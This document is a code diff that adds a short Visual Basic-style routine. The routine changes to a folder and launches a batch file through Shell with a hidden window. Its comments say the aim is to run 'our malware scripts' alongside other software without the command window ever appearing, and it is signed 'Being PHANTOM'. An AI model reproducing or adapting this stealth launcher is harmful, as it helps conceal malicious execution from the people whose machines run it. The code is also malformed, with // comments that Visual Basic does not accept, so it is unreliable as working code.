@@ -1,0 +1,23 @@
+//here the code will help us execute our requred batch files without  the terminal pooping out while the execution is going on
+
+
+Sub test()
+//test can be any name as per your choice
+
+chdir ("c:\Users\..\..\folder")
+
+//migrating to the required folder where our batch file is present
+//if the file is in same directory as this file it doen't need to migrate
+
+a= Shell("file.bat", 0)
+
+//here the file.bat is the required batch file
+End Sub
+
+//now this file must be run during the execution of the software
+//containg our malware scripts 
+//and the cmd terminal won't even pop up for once
+
+
+------------------------------Being PHANTOM--------------------------------------
+  
